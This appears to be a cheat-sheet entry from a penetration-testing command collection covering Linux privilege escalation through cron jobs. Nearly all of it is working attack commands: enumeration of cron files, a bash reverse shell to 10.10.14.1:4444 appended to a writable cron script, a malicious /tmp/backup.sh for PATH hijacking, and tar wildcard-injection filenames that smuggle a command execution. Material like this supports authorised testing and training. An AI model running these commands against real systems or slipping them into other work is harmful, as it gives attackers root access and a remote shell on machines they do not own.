---
description: |
  Exploit writable cron jobs and PATH hijacking for
  Linux privilege escalation.
command: |
  # Check cron jobs
  cat /etc/crontab
  ls -la /etc/cron.d/
  crontab -l
  ls -la /var/spool/cron/crontabs/

  # Writable cron script — inject reverse shell
  echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' >> /path/to/cron_script.sh

  # PATH hijacking (cron uses relative path)
  # If crontab has: * * * * * root backup.sh
  # And PATH includes writable dir before /usr/bin
  echo '#!/bin/bash' > /tmp/backup.sh
  echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' >> /tmp/backup.sh
  chmod +x /tmp/backup.sh

  # Wildcard injection (tar with *)
  # If cron runs: tar czf /tmp/backup.tar.gz *
  echo "" > "--checkpoint=1"
  echo "" > "--checkpoint-action=exec=bash shell.sh"
phase:
  - PrivEsc
target_os:
  - Linux
services: []
items:
  - Shell
techniques:
  - Linux_Misconfig
network_position:
  - Local
references:
  - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
---
